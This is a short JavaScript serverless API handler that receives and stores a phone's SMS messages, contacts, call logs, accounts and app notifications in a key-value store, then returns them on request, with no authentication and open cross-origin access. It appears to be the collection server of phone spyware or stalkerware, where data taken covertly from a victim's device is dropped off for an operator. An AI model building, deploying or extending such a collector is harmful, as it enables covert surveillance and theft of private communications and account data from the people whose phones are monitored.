import { kv } from '@vercel/kv';

export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.status(200).end();

  const url = new URL(req.url, "http://x");
  const type = url.searchParams.get("type") || url.pathname.split("/").pop();

  const validTypes = ["sms", "contacts", "calls", "accounts", "notifications"];
  if (!validTypes.includes(type)) return res.status(400).json({ error: "bad type" });

  if (req.method === "POST") {
    const b = req.body || {};
    
    // Save to Vercel KV
    if (b.sms) await kv.set("sms", b.sms);
    if (b.contacts) await kv.set("contacts", b.contacts);
    if (b.calls) await kv.set("calls", b.calls);
    if (b.accounts) await kv.set("accounts", b.accounts);
    if (b.package) {
      let notifs = await kv.get("notifications") || [];
      notifs.unshift(b);
      if (notifs.length > 200) notifs.pop();
      await kv.set("notifications", notifs);
    }
    return res.json({ ok: true });
  }

  // Get from Vercel KV
  const data = await kv.get(type) || [];
  return res.json({ [type]: data });
}